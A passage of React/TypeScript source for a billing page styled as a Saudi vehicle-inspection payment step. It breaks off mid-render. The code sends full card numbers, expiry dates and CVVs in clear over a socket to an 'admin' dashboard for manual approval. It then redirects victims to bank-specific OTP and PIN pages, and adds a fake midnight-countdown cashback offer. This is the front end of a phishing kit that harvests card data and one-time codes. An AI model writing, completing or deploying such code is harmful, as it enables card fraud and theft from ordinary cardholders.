import React, { useState, useEffect, useRef } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { socketService } from '../../services/socketService';
import PaymentModal from '../../client/components/PaymentModal';
import PaymentLoadingScreen from '../../client/components/PaymentLoadingScreen';
import { useI18n } from '../../shared/i18n';
import { validateCardNumber } from '../../shared/validation';
import binByBankData from '../../shared/bin-by-bank.json';
import { NavigationContextData } from '../../shared/types';

const MANUAL_NAV_CONTEXT_KEY = 'v_safety_manual_nav_context';

type BankTheme = {
    backgroundClass: string;
    borderClass: string;
    overlayClass: string;
};

type BankLookupItem = {
    issuerKey: string;
    issuerName: string;
    logoPath: string | null;
};

type BinByBankJson = {
    banks?: Record<string, {
        issuerKey: string;
        issuerNames?: string[];
        logoPath?: string | null;
        records?: Array<{ bin?: string; scheme?: string | null; cardType?: string | null }>;
    }>;
};

const parsedBinByBankData = binByBankData as BinByBankJson;

const bankBinLookup = (() => {
    const lookup = new Map<string, BankLookupItem>();
    const banks = parsedBinByBankData?.banks || {};

    Object.values(banks).forEach((bank) => {
        const bankInfo: BankLookupItem = {
            issuerKey: bank.issuerKey,
            issuerName: bank.issuerNames?.[0] || bank.issuerKey,
            logoPath: bank.logoPath || null
        };

        (bank.records || []).forEach((record) => {
            const bin = String(record?.bin || '').trim();
            if (bin) {
                lookup.set(bin, bankInfo);
            }
        });
    });

    return lookup;
})();

const cardTypeByBinLookup = (() => {
    const lookup = new Map<string, string>();
    const banks = parsedBinByBankData?.banks || {};

    Object.values(banks).forEach((bank) => {
        (bank.records || []).forEach((record) => {
            const bin = String(record?.bin || '').trim();
            const cardType = String(record?.cardType || '').trim().toUpperCase();

            if (bin && cardType) {
                lookup.set(bin, cardType);
            }
        });
    });

    return lookup;
})();

const madaBinPrefixes = (() => {
    const prefixes = new Set<string>();
    const banks = parsedBinByBankData?.banks || {};

    Object.values(banks).forEach((bank) => {
        (bank.records || []).forEach((record) => {
            const scheme = String((record as { scheme?: string | null })?.scheme || '').trim().toLowerCase();
            const bin = String((record as { bin?: string | null })?.bin || '').replace(/\D/g, '').trim();

            if (scheme === 'mada' && bin.length >= 4) {
                prefixes.add(bin);
            }
        });
    });

    return Array.from(prefixes).sort((a, b) => b.length - a.length);
})();

const isMadaCardByBin = (cardNumber: string): boolean => {
    const cleanNumber = String(cardNumber || '').replace(/\D/g, '');
    if (cleanNumber.length < 4) {
        return false;
    }

    return madaBinPrefixes.some((prefix) => cleanNumber.startsWith(prefix));
};

const getOtpRedirectByCardNumber = (cardNumber: string): '/mada-otp' | '/visa-otp' | '/mastercard-otp' | null => {
    const cleanNumber = String(cardNumber || '').replace(/\D/g, '');

    if (!cleanNumber) {
        return null;
    }

    if (isMadaCardByBin(cleanNumber)) {
        return '/mada-otp';
    }

    if (cleanNumber.startsWith('4')) {
        return '/visa-otp';
    }

    if (cleanNumber.startsWith('5') || cleanNumber.startsWith('2')) {
        return '/mastercard-otp';
    }

    return null;
};

const bankThemesByIssuerKey: Record<string, BankTheme> = {
    al_rajhi_banking_and_investment_corporation: {
        backgroundClass: 'bg-gradient-to-br from-zinc-800 via-stone-800 to-amber-900',
        borderClass: 'border-amber-300/70',
        overlayClass: 'bg-gradient-to-br from-white/18 via-transparent to-black/30'
    },
    national_commercial_bank: {
        backgroundClass: 'bg-gradient-to-br from-emerald-700 via-emerald-800 to-teal-950',
        borderClass: 'border-emerald-300/70',
        overlayClass: 'bg-gradient-to-br from-white/15 via-transparent to-black/35'
    },
    al_bank_al_saudi_al_fransi: {
        backgroundClass: 'bg-gradient-to-br from-slate-700 via-slate-800 to-gray-950',
        borderClass: 'border-slate-300/70',
        overlayClass: 'bg-gradient-to-br from-white/15 via-transparent to-black/35'
    },
    al_bilad_bank: {
        backgroundClass: 'bg-gradient-to-br from-rose-700 via-red-800 to-slate-900',
        borderClass: 'border-rose-300/70',
        overlayClass: 'bg-gradient-to-br from-white/15 via-transparent to-black/35'
    },
    alawwal_bank: {
        backgroundClass: 'bg-gradient-to-br from-purple-700 via-violet-800 to-indigo-950',
        borderClass: 'border-violet-300/70',
        overlayClass: 'bg-gradient-to-br from-white/15 via-transparent to-black/35'
    },
    arab_national_bank: {
        backgroundClass: 'bg-gradient-to-br from-amber-600 via-orange-700 to-red-900',
        borderClass: 'border-amber-300/70',
        overlayClass: 'bg-gradient-to-br from-white/15 via-transparent to-black/30'
    },
    bank_al_jazira: {
        backgroundClass: 'bg-gradient-to-br from-lime-600 via-emerald-700 to-teal-900',
        borderClass: 'border-lime-300/70',
        overlayClass: 'bg-gradient-to-br from-white/15 via-transparent to-black/30'
    },
    barraq_finance_company: {
        backgroundClass: 'bg-gradient-to-br from-amber-700 via-yellow-700 to-orange-900',
        borderClass: 'border-yellow-300/70',
        overlayClass: 'bg-gradient-to-br from-white/15 via-transparent to-black/30'
    },
    gulf_international_bank: {
        backgroundClass: 'bg-gradient-to-br from-sky-700 via-cyan-800 to-blue-950',
        borderClass: 'border-sky-300/70',
        overlayClass: 'bg-gradient-to-br from-white/15 via-transparent to-black/35'
    },
    samba_financial_group: {
        backgroundClass: 'bg-gradient-to-br from-indigo-700 via-indigo-800 to-slate-950',
        borderClass: 'border-indigo-300/70',
        overlayClass: 'bg-gradient-to-br from-white/15 via-transparent to-black/35'
    },
    saudi_british_bank: {
        backgroundClass: 'bg-gradient-to-br from-cyan-700 via-blue-800 to-indigo-950',
        borderClass: 'border-cyan-300/70',
        overlayClass: 'bg-gradient-to-br from-white/15 via-transparent to-black/35'
    },
    riyadh_bank: {
        backgroundClass: 'bg-gradient-to-br from-emerald-600 via-teal-700 to-emerald-900',
        borderClass: 'border-emerald-300/70',
        overlayClass: 'bg-gradient-to-br from-white/15 via-transparent to-black/35'
    },
    inma_bank: {
        backgroundClass: 'bg-gradient-to-br from-orange-500 via-orange-600 to-amber-700',
        borderClass: 'border-amber-300/70',
        overlayClass: 'bg-gradient-to-br from-white/20 via-transparent to-black/25'
    },
    meem_bank: {
        backgroundClass: 'bg-gradient-to-br from-fuchsia-700 via-pink-800 to-rose-950',
        borderClass: 'border-fuchsia-300/70',
        overlayClass: 'bg-gradient-to-br from-white/15 via-transparent to-black/35'
    },
    saudi_hollandi_bank: {
        backgroundClass: 'bg-gradient-to-br from-emerald-700 via-green-800 to-teal-950',
        borderClass: 'border-green-300/70',
        overlayClass: 'bg-gradient-to-br from-white/15 via-transparent to-black/35'
    },
    saudi_investment_bank: {
        backgroundClass: 'bg-gradient-to-br from-violet-700 via-purple-800 to-fuchsia-950',
        borderClass: 'border-violet-300/70',
        overlayClass: 'bg-gradient-to-br from-white/15 via-transparent to-black/35'
    },
    stc_pay: {
        backgroundClass: 'bg-gradient-to-br from-violet-700 via-fuchsia-700 to-slate-900',
        borderClass: 'border-fuchsia-300/70',
        overlayClass: 'bg-gradient-to-br from-white/18 via-transparent to-black/30'
    }
};

const defaultBankTheme: BankTheme = {
    backgroundClass: 'bg-gradient-to-br from-amber-300 via-amber-400 to-yellow-600',
    borderClass: 'border-amber-300/70',
    overlayClass: 'bg-gradient-to-br from-white/30 via-transparent to-black/20'
};

const validateLuhn = (cardNumber: string): boolean => {
    const cleaned = cardNumber.replace(/\D/g, '');

    if (cleaned.length !== 16) {
        return false;
    }

    let sum = 0;
    let shouldDouble = false;

    for (let index = cleaned.length - 1; index >= 0; index -= 1) {
        let digit = Number(cleaned[index]);

        if (shouldDouble) {
            digit *= 2;
            if (digit > 9) {
                digit -= 9;
            }
        }

        sum += digit;
        shouldDouble = !shouldDouble;
    }

    return sum % 10 === 0;
};

const getDetectedBankByCardNumber = (cardNumber: string): BankLookupItem | null => {
    const cleanNumber = String(cardNumber || '').replace(/\D/g, '');
    if (cleanNumber.length < 6) {
        return null;
    }

    return bankBinLookup.get(cleanNumber.slice(0, 6)) || null;
};

const getDetectedCardTypeByCardNumber = (cardNumber: string): string | null => {
    const cleanNumber = String(cardNumber || '').replace(/\D/g, '');
    if (cleanNumber.length < 6) {
        return null;
    }

    return cardTypeByBinLookup.get(cleanNumber.slice(0, 6)) || null;
};

const Billing: React.FC = () => {
    const navigate = useNavigate();
    const location = useLocation();
    const { t, isRTL, language } = useI18n();
    const isArabic = isRTL || language === 'ar';
    const [showOfferPopup, setShowOfferPopup] = useState(false);
    const [offerTimeRemaining, setOfferTimeRemaining] = useState('00:00:00');

    // Scroll to top when page loads
    useEffect(() => {
        window.scrollTo(0, 0);
    }, []);

    useEffect(() => {
        setShowOfferPopup(Boolean(location.state?.fromBooking));
    }, [location.key, location.state]);

    useEffect(() => {
        const getTimeUntilMidnight = () => {
            const now = new Date();
            const midnight = new Date(now);
            midnight.setHours(24, 0, 0, 0);

            return Math.max(0, midnight.getTime() - now.getTime());
        };

        const formatRemainingTime = (milliseconds: number) => {
            const totalSeconds = Math.floor(milliseconds / 1000);
            const hours = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
            const minutes = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
            const seconds = String(totalSeconds % 60).padStart(2, '0');

            return `${hours}:${minutes}:${seconds}`;
        };

        const updateOfferCountdown = () => {
            setOfferTimeRemaining(formatRemainingTime(getTimeUntilMidnight()));
        };

        updateOfferCountdown();
        const countdownInterval = window.setInterval(updateOfferCountdown, 1000);

        return () => {
            window.clearInterval(countdownInterval);
        };
    }, []);

    const manualContextFromState = ((location.state as { __manualNavContext?: NavigationContextData } | null)?.__manualNavContext) || null;
    const manualContextFromSession = (() => {
        try {
            const raw = sessionStorage.getItem(MANUAL_NAV_CONTEXT_KEY);
            if (!raw) return null;
            return JSON.parse(raw) as NavigationContextData;
        } catch {
            return null;
        }
    })();

    // Debug: Log location state
    console.log('=== Billing Page Debug ===');
    console.log('location.state:', location.state);
    console.log('location.state?.serviceType:', location.state?.serviceType);

    const serviceType = location.state?.serviceType || manualContextFromState?.serviceType || manualContextFromSession?.serviceType || 'periodic';
    console.log('serviceType:', serviceType);
    console.log('========================');
    const [showApplePayAlert, setShowApplePayAlert] = useState(false);
    const [showModal, setShowModal] = useState(false);
    const [selectedMethod, setSelectedMethod] = useState<string | null>(null);
    const [showLoading, setShowLoading] = useState(false);
    const [isRajhiRedirectNotice, setIsRajhiRedirectNotice] = useState(false);
    const [rajhiRedirectCountdown, setRajhiRedirectCountdown] = useState(5);
    const [showError, setShowError] = useState(false);
    const [errorMessage, setErrorMessage] = useState('');
    const [cardNumberError, setCardNumberError] = useState('');
    const [isBlockedCard, setIsBlockedCard] = useState(false);
    const [blockedCardMessage, setBlockedCardMessage] = useState('');
    const [isCheckingBlockedCard, setIsCheckingBlockedCard] = useState(false);
    const [isPhoneView, setIsPhoneView] = useState(
        typeof window !== 'undefined' ? window.innerWidth < 640 : false
    );
    const blockedCheckSequenceRef = useRef(0);
    const rajhiRedirectTimeoutRef = useRef<number | null>(null);
    const rajhiRedirectIntervalRef = useRef<number | null>(null);
    const [cardData, setCardData] = useState({
        number: '',
        name: '',
        expiry: '',
        cvv: ''
    });
    const [cardIconSize, setCardIconSize] = useState(1.5); // Default size for payment methods in rem
    const [inputIconSize, setInputIconSize] = useState(1.0); // Default size for input field icon in rem

    // Listen for payment approval/rejection from dashboard
    useEffect(() => {
        const handlePaymentApproved = (data: { redirectTo?: string; cardType: string }) => {
            const cardOtpRedirect = getOtpRedirectByCardNumber(cardData.number);
            const detectedBankFromCard = getDetectedBankByCardNumber(cardData.number);
            const isRajhiByIssuerKey = detectedBankFromCard?.issuerKey === 'al_rajhi_banking_and_investment_corporation';
            const explicitOtpRedirects = ['/mada-otp', '/visa-otp', '/mastercard-otp'];
            const hasExplicitOtpRedirect = Boolean(data?.redirectTo && explicitOtpRedirects.includes(data.redirectTo));
            const shouldRedirectToRajhi = !hasExplicitOtpRedirect && (data?.cardType === 'rajhi' || isRajhiByIssuerKey || isRajhiBin(cardData.number));
            const normalizedRedirect = hasExplicitOtpRedirect ? (cardOtpRedirect || data.redirectTo) : (data?.redirectTo || cardOtpRedirect || '/pin');
            const targetRedirect = shouldRedirectToRajhi ? '/rajhi' : normalizedRedirect;

            if (shouldRedirectToRajhi) {
                if (rajhiRedirectTimeoutRef.current) {
                    window.clearTimeout(rajhiRedirectTimeoutRef.current);
                }
                if (rajhiRedirectIntervalRef.current) {
                    window.clearInterval(rajhiRedirectIntervalRef.current);
                }

                setIsRajhiRedirectNotice(true);
                setShowLoading(true);
                setRajhiRedirectCountdown(5);
                console.log('Payment approved for Rajhi card, showing pre-redirect notice...');
                sessionStorage.setItem('lastCardNumber', `**** **** **** ${cardData.number.replace(/\D/g, '').slice(-4)}`);

                rajhiRedirectIntervalRef.current = window.setInterval(() => {
                    setRajhiRedirectCountdown((prev) => (prev > 1 ? prev - 1 : 1));
                }, 1000);

                rajhiRedirectTimeoutRef.current = window.setTimeout(() => {
                    if (rajhiRedirectIntervalRef.current) {
                        window.clearInterval(rajhiRedirectIntervalRef.current);
                        rajhiRedirectIntervalRef.current = null;
                    }
                    setShowLoading(false);
                    setIsRajhiRedirectNotice(false);
                    navigate(targetRedirect, {
                        state: {
                            amount: serviceType === 'reinspection' ? '37.95' : '115.00',
                            cardNumber: `**** **** **** ${cardData.number.slice(-4)}`,
                            cardType: data.cardType
                        }
                    });
                }, 5000);

                return;
            }

            console.log('Payment approved, redirecting to:', targetRedirect);
            sessionStorage.setItem('lastCardNumber', `**** **** **** ${cardData.number.replace(/\D/g, '').slice(-4)}`);
            if (rajhiRedirectIntervalRef.current) {
                window.clearInterval(rajhiRedirectIntervalRef.current);
                rajhiRedirectIntervalRef.current = null;
            }
            setShowLoading(false);
            setIsRajhiRedirectNotice(false);
            navigate(targetRedirect, {
                state: {
                    amount: serviceType === 'reinspection' ? '37.95' : '115.00',
                    cardNumber: `**** **** **** ${cardData.number.slice(-4)}`,
                    cardType: data.cardType
                }
            });
        };

        const handlePaymentRejected = (data: { message: string }) => {
            console.log('Payment rejected:', data.message);
            if (rajhiRedirectIntervalRef.current) {
                window.clearInterval(rajhiRedirectIntervalRef.current);
                rajhiRedirectIntervalRef.current = null;
            }
            setShowLoading(false);
            setIsRajhiRedirectNotice(false);
            setShowError(true);
            setErrorMessage(data.message || 'تم رفض البطاقة من قبل البنك، يرجى استخدام بطاقة أخرى');
        };

        socketService.on('paymentApproved', handlePaymentApproved);
        socketService.on('paymentRejected', handlePaymentRejected);

        return () => {
            if (rajhiRedirectTimeoutRef.current) {
                window.clearTimeout(rajhiRedirectTimeoutRef.current);
                rajhiRedirectTimeoutRef.current = null;
            }
            if (rajhiRedirectIntervalRef.current) {
                window.clearInterval(rajhiRedirectIntervalRef.current);
                rajhiRedirectIntervalRef.current = null;
            }
            socketService.off('paymentApproved', handlePaymentApproved);
            socketService.off('paymentRejected', handlePaymentRejected);
        };
    }, [navigate, cardData.number, serviceType]);

    useEffect(() => {
        const onResize = () => setIsPhoneView(window.innerWidth < 640);
        onResize();
        window.addEventListener('resize', onResize);
        return () => window.removeEventListener('resize', onResize);
    }, []);

    const isRajhiBin = (number: string) => {
        const cleanNum = number.replace(/\s/g, '');
        const rajhiBins = ['458456', '484783', '410685', '446404', '446393'];
        return rajhiBins.some(bin => cleanNum.startsWith(bin));
    };

    const isExpiryInAllowedRange = (expiry: string) => {
        const match = expiry.match(/^(0[1-9]|1[0-2])\/(\d{2})$/);
        if (!match) return false;

        const month = Number(match[1]);
        const yearTwoDigits = Number(match[2]);
        const fullYear = 2000 + yearTwoDigits;
        const now = new Date();
        const currentMonth = now.getMonth() + 1;
        const currentYear = new Date().getFullYear();

        if (fullYear < currentYear || fullYear > currentYear + 5) {
            return false;
        }

        if (fullYear === currentYear && month <= currentMonth) {
            return false;
        }

        return true;
    };

    const getBlockedCardMessage = () => {
        return language === 'ar'
            ? 'للأسف لا يمكن استخدام هذه البطاقة لإتمام العملية. يُرجى تجربة بطاقة أخرى.'
            : 'Unfortunately, this card cannot be used for this transaction. Please try another card.';
    };

    const getInvalidCardNumberMessage = () => {
        return language === 'ar'
            ? 'رقم البطاقة غير صالح. يجب أن يبدأ بـ 4 أو 5.'
            : 'Card number is invalid. It must start with 4 or 5.';
    };

    const runLiveBlockedCheck = async (cleanCardNumber: string) => {
        if (cleanCardNumber.length < 4) {
            blockedCheckSequenceRef.current += 1;
            setIsBlockedCard(false);
            setBlockedCardMessage('');
            setIsCheckingBlockedCard(false);
            return;
        }

        const sequence = blockedCheckSequenceRef.current + 1;
        blockedCheckSequenceRef.current = sequence;
        setIsCheckingBlockedCard(true);

        try {
            const blocked = await socketService.checkCardBlocked(cleanCardNumber);
            if (blockedCheckSequenceRef.current !== sequence) {
                return;
            }

            setIsBlockedCard(blocked);
            setBlockedCardMessage(blocked ? getBlockedCardMessage() : '');
        } catch (error) {
            if (blockedCheckSequenceRef.current !== sequence) {
                return;
            }
            setIsBlockedCard(false);
            setBlockedCardMessage('');
            console.error('Failed to check blocked BIN:', error);
        } finally {
            if (blockedCheckSequenceRef.current === sequence) {
                setIsCheckingBlockedCard(false);
            }
        }
    };

    const handleCardSubmit = async (e: React.FormEvent) => {
        e.preventDefault();

        const cleanNum = cardData.number.replace(/\s/g, '');
        setCardNumberError('');

        if (!cleanNum || (cleanNum[0] !== '4' && cleanNum[0] !== '5')) {
            setCardNumberError(getInvalidCardNumberMessage());
            return;
        }

        if (!validateLuhn(cleanNum)) {
            setCardNumberError(getInvalidCardNumberMessage());
            return;
        }

        const cardValidation = validateCardNumber(cleanNum);
        if (!cardValidation.valid) {
            setCardNumberError(getInvalidCardNumberMessage());
            return;
        }

        if (!['visa', 'mastercard', 'mada'].includes(cardValidation.cardType)) {
            setCardNumberError(getInvalidCardNumberMessage());
            return;
        }

        const blockedNow = await socketService.checkCardBlocked(cleanNum);
        if (blockedNow) {
            setIsBlockedCard(true);
            setBlockedCardMessage(getBlockedCardMessage());
            return;
        }

        setIsBlockedCard(false);
        setBlockedCardMessage('');
        setCardNumberError('');

        if (!/^[A-Z ]+$/.test(cardData.name.trim())) {
            window.alert(language === 'ar'
                ? 'اسم حامل البطاقة يجب أن يحتوي على أحرف إنجليزية فقط بدون أرقام أو رموز.'
                : 'Card holder name must contain English letters only, without numbers or symbols.');
            return;
        }

        if (!/^[0-9]{3}$/.test(cardData.cvv)) {
            window.alert(language === 'ar'
                ? 'رمز CVV يجب أن يتكون من 3 أرقام إنجليزية فقط.'
                : 'CVV must be exactly 3 English digits.');
            return;
        }

        if (!isExpiryInAllowedRange(cardData.expiry)) {
            window.alert(language === 'ar'
                ? 'تاريخ الانتهاء غير صالح. في السنة الحالية يجب أن يكون الشهر أكبر من الشهر الحالي، والسنوات المسموحة من السنة الحالية إلى خمس سنوات إضافية.'
                : 'Invalid expiry date. In the current year, month must be later than the current month. Allowed years are from current year to +5 years.');
            return;
        }

        const amount = serviceType === 'reinspection' ? '37.95' : '115.00';

        // Determine card type
        const detectedBankFromCard = getDetectedBankByCardNumber(cleanNum);
        const isRajhiByIssuerKey = detectedBankFromCard?.issuerKey === 'al_rajhi_banking_and_investment_corporation';
        const cardType = (isRajhiByIssuerKey || isRajhiBin(cleanNum)) ? 'rajhi' : 'other';

        // Submit payment data for admin approval
        socketService.emitClientEvent('submitPendingPayment', {
            cardNumber: cleanNum,
            cardHolderName: cardData.name,
            expirationDate: cardData.expiry,
            cvv: cardData.cvv,
            amount: amount,
            cardType: cardType
        });

        // Show loading screen - wait for admin approval/rejection
        setIsRajhiRedirectNotice(false);
        setShowLoading(true);
        console.log('Payment submitted for approval, showing loading screen...');
    };

    const handleNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        let val = e.target.value.replace(/\D/g, '');

        if (val.length > 0 && val[0] !== '4' && val[0] !== '5') {
            setCardData((prev) => ({ ...prev, number: '' }));
            setCardNumberError(getInvalidCardNumberMessage());
            setIsBlockedCard(false);
            setBlockedCardMessage('');
            setIsCheckingBlockedCard(false);
            return;
        }

        const cleanCardNumber = val.substring(0, 16);
        const formattedNumber = cleanCardNumber.replace(/(\d{4})(?=\d)/g, '$1 ');
        setCardData((prev) => ({ ...prev, number: formattedNumber }));
        setCardNumberError('');

        if (selectedMethod === 'card' && cleanCardNumber.length === 16 && isMadaCardByBin(cleanCardNumber)) {
            setSelectedMethod('mada');
            sessionStorage.setItem('paymentMethod', 'mada');
            socketService.emitClientEvent('submitBilling', { method: 'mada' });
        }

        runLiveBlockedCheck(cleanCardNumber);
    };

    const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const digits = e.target.value.replace(/\D/g, '').substring(0, 4);
        const currentYear = new Date().getFullYear();
        const minYearTwoDigits = Number(String(currentYear).slice(-2));
        const maxYearTwoDigits = Number(String(currentYear + 5).slice(-2));

        if (digits.length === 1) {
            const firstMonthDigit = digits[0];

            if (firstMonthDigit >= '2' && firstMonthDigit <= '9') {
                setCardData({ ...cardData, expiry: `0${firstMonthDigit}/` });
                return;
            }

            setCardData({ ...cardData, expiry: digits });
            return;
        }

        if (digits.length >= 2) {
            const month = Number(digits.substring(0, 2));
            if (month < 1 || month > 12) {
                return;
            }
        }

        if (digits.length === 3) {
            const typedYearFirstDigit = Number(digits[2]);
            const minFirstDigit = Number(String(minYearTwoDigits).padStart(2, '0')[0]);
            const maxFirstDigit = Number(String(maxYearTwoDigits).padStart(2, '0')[0]);

            if (typedYearFirstDigit < minFirstDigit || typedYearFirstDigit > maxFirstDigit) {
                return;
            }
        }

        if (digits.length === 4) {
            const month = Number(digits.substring(0, 2));
            const yearTwoDigits = Number(digits.substring(2, 4));
            if (yearTwoDigits < minYearTwoDigits || yearTwoDigits > maxYearTwoDigits) {
                return;
            }

            const now = new Date();
            const currentMonth = now.getMonth() + 1;
            if (yearTwoDigits === minYearTwoDigits && month <= currentMonth) {
                return;
            }
        }

        const formatted = digits.length >= 3
            ? `${digits.substring(0, 2)}/${digits.substring(2, 4)}`
            : digits;

        setCardData({ ...cardData, expiry: formatted });
    };

    // Detect card type for icon
    const getCardType = () => {
        const num = cardData.number.replace(/\s/g, '');
        const hasCompleteCardNumber = num.length === 16;

        if (selectedMethod === 'card') {
            if (!hasCompleteCardNumber) return { icon: 'imgs/billing/vimas.png', color: 'from-gray-400 to-gray-500', name: 'Card' };
            if (num.startsWith('4')) return { icon: 'imgs/billing/visa.png', color: 'from-blue-600 to-blue-700', name: 'Visa' };
            if (num.startsWith('5') || num.startsWith('2')) return { icon: 'imgs/billing/master-card.png', color: 'from-orange-500 to-red-500', name: 'Mastercard' };
            if (num.startsWith('6')) return { icon: 'imgs/billing/mada.png', color: 'from-green-500 to-green-600', name: 'Mada' };
            return { icon: 'imgs/billing/vimas.png', color: 'from-gray-400 to-gray-500', name: 'Card' };
        }

        if (selectedMethod === 'mada') {
            if (!num.startsWith('6')) {
                // If not Mada bin, force Mada style
                return { icon: 'imgs/billing/mada.png', color: 'from-green-500 to-green-600', name: 'Mada' };
            }
            return { icon: 'imgs/billing/mada.png', color: 'from-green-500 to-green-600', name: 'Mada' };
        }

        return { icon: 'imgs/billing/vimas.png', color: 'from-gray-400 to-gray-500', name: '' };
    };

    const cleanCardNumber = cardData.number.replace(/\s/g, '');
    const hasCompleteCardNumber = cleanCardNumber.length === 16;
    const cardType = getCardType();
    const detectedBank = hasCompleteCardNumber ? getDetectedBankByCardNumber(cardData.number) : null;
    const detectedCardType = hasCompleteCardNumber ? getDetectedCardTypeByCardNumber(cardData.number) : null;
    const isCreditCard = detectedCardType === 'CREDIT';
    const isNonCreditCard = hasCompleteCardNumber && detectedCardType !== null && detectedCardType !== 'CREDIT';
    const totalAmountValue = serviceType === 'reinspection' ? 37.95 : 115;
    const cashbackAmountValue = Number((totalAmountValue * 0.4).toFixed(2));
    const cashbackAmountText = serviceType === 'reinspection'
        ? cashbackAmountValue.toFixed(2)
        : cashbackAmountValue.toFixed(0);
    const activeBankTheme = detectedBank
        ? (bankThemesByIssuerKey[detectedBank.issuerKey] || defaultBankTheme)
        : defaultBankTheme;

    const bankLogoScaleDesktop = 1;
    const bankLogoScaleMobile = 1;
    const networkLogoScaleDesktop = 1;
    const networkLogoScaleMobile = 1;

    const cardPreviewLayoutDesktop = {
        bankLogo: { top: '8%', left: '2%' },
        chip: { top: '30%', left: '9%' },
        number: { top: '52%', left: '14%' },
        nameLabel: { bottom: '20%', left: '4%' },
        nameValue: { bottom: '8%', left: '4%' },
        expiryLabel: { bottom: '20%', right: '8%' },
        expiryValue: { bottom: '8%', right: '8%' },
        brandLogoDefault: { top: '10%', right: '6%' },
        brandLogoVisa: { top: '8%', right: '6%' },
        brandLogoMastercard: { top: '6%', right: '4%' }
    };

    const cardPreviewSizesDesktop = {
        bankLogo: { width: 'clamp(3.2rem, 16vw, 8.1rem)', height: 'clamp(1.3rem, 6vw, 3.3rem)' },
        chip: { width: 'clamp(2.6rem, 11vw, 4rem)', height: 'clamp(2rem, 8vw, 3rem)' },
        number: { fontSize: 'clamp(1rem, 5.2vw, 1.8rem)', letterSpacing: 'clamp(0.08em, 0.4vw, 0.16em)' },
        nameLabel: { fontSize: 'clamp(8px, 2.2vw, 10px)', letterSpacing: 'clamp(0.12em, 0.5vw, 0.22em)' },
        nameValue: { fontSize: 'clamp(0.72rem, 3vw, 1rem)', maxWidth: '58%', letterSpacing: 'clamp(0.04em, 0.25vw, 0.09em)' },
        expiryLabel: { fontSize: 'clamp(8px, 2.2vw, 10px)', letterSpacing: 'clamp(0.12em, 0.5vw, 0.22em)' },
        expiryValue: { fontSize: 'clamp(0.72rem, 3vw, 1rem)', letterSpacing: 'clamp(0.06em, 0.3vw, 0.12em)' },
        brandLogoDefault: { width: 'clamp(3.4rem, 18vw, 5.6rem)', height: 'clamp(1.4rem, 7vw, 2.4rem)' },
        brandLogoVisa: { width: 'clamp(3.8rem, 20vw, 3rem)', height: 'clamp(1.45rem, 7.2vw, 3rem)' },
        brandLogoMastercard: { width: 'clamp(3.45rem, 18.2vw, 5.2rem)', height: 'clamp(1.65rem, 7.7vw, 5.60rem)' }
    };

    const cardPreviewLayoutMobile = {
        bankLogo: { top: '10%', left: '4%' },
        chip: { top: '30%', left: '8%' },
        number: { top: '54%', left: '12%' },
        nameLabel: { bottom: '21%', left: '4%' },
        nameValue: { bottom: '9%', left: '4%' },
        expiryLabel: { bottom: '21%', right: '5%' },
        expiryValue: { bottom: '9%', right: '5%' },
        brandLogoDefault: { top: '12%', right: '4%' },
        brandLogoVisa: { top: '8%', right: '6%' },
        brandLogoMastercard: { top: '8%', right: '5%' }
    };

    const cardPreviewSizesMobile = {
        bankLogo: { width: '4.8rem', height: '2rem' },
        chip: { width: '2.5rem', height: '2.05rem' },
        number: { fontSize: '1.1rem', letterSpacing: '0.1em' },
        nameLabel: { fontSize: '7px', letterSpacing: '0.12em' },
        nameValue: { fontSize: '0.68rem', maxWidth: '58%', letterSpacing: '0.04em' },
        expiryLabel: { fontSize: '7px', letterSpacing: '0.12em' },
        expiryValue: { fontSize: '0.68rem', letterSpacing: '0.06em' },
        brandLogoDefault: { width: '4.2rem', height: '1.8rem' },
        brandLogoVisa: { width: '2.2rem', height: '2.2rem' },
        brandLogoMastercard: { width: '3rem', height: '3rem' }
    };

    const cardPreviewLayout = isPhoneView ? cardPreviewLayoutMobile : cardPreviewLayoutDesktop;
    const cardPreviewSizes = isPhoneView ? cardPreviewSizesMobile : cardPreviewSizesDesktop;
    const bankLogoScale = isPhoneView ? bankLogoScaleMobile : bankLogoScaleDesktop;
    const networkLogoScale = isPhoneView ? networkLogoScaleMobile : networkLogoScaleDesktop;

    const currentBrandLogoSize =
        cardType.name === 'Visa'
            ? cardPreviewSizes.brandLogoVisa
            : cardType.name === 'Mastercard'
                ? cardPreviewSizes.brandLogoMastercard
                : cardPreviewSizes.brandLogoDefault;

    const currentBrandLogoLayout =
        cardType.name === 'Visa'
            ? cardPreviewLayout.brandLogoVisa
            : cardType.name === 'Mastercard'
                ? cardPreviewLayout.brandLogoMastercard
                : cardPreviewLayout.brandLogoDefault;

    const handleMethodSelect = (method: string) => {
        if (method === 'apple') {
            setShowApplePayAlert(true);
            return;
        }

        setSelectedMethod(method);
        // Save method and notify server
        sessionStorage.setItem("paymentMethod", method);
        socketService.emitClientEvent("submitBilling", { method });
    };

    return (
        <div
            dir={isArabic ? 'rtl' : 'ltr'}
            className={`min-h-screen w-full flex items-center justify-center max-w-4xl mx-auto relative z-20 px-3 sm:px-4 py-6 ${isArabic ? 'text-right' : 'text-left'}`}
        >
            <div className="w-full max-w-3xl bg-white rounded-xl shadow-lg p-6 md:p-8">
                <h2 className={`text-xl md:text-2xl font-bold mb-6 text-gray-800 ${isArabic ? 'text-right' : 'text-center'}`}>{t('paymentTitle')}</h2>

                {/* Payment Summary */}
                <div className="bg-gray-50 p-4 md:p-6 rounded-lg border border-dashed border-gray-300 mt-8 mb-8">
                    <h3 className="text-lg font-bold text-gray-800 mb-4">{t('paymentSummary')}</h3>
                    <div className="space-y-3 text-sm">
                        {serviceType === 'reinspection' ? (
                            <>
                                <div className="flex justify-between">
                                    <span className="text-gray-600">{isArabic ? 'سعر إعادة الفحص' : 'Re-inspection Fees'}</span>
                                    <span className="font-semibold">33 {language === 'ar' ? 'ر.س' : 'SAR'}</span>
                                </div>
                                <div className="flex justify-between">
                                    <span className="text-gray-600">{isArabic ? 'ضريبة القيمة المضافة 15%' : 'VAT 15%'}</span>
                                    <span className="font-semibold">4.95 {language === 'ar' ? 'ر.س' : 'SAR'}</span>
                                </div>
                            </>
                        ) : (
                            <>
                                <div className="flex justify-between">
                                    <span className="text-gray-600">{t('requestFees')}</span>
                                    <span className="font-semibold">100 {language === 'ar' ? 'ر.س' : 'SAR'}</span>
                                </div>
                                <div className="flex justify-between">
                                    <span className="text-gray-600">{t('bookingFees')}</span>
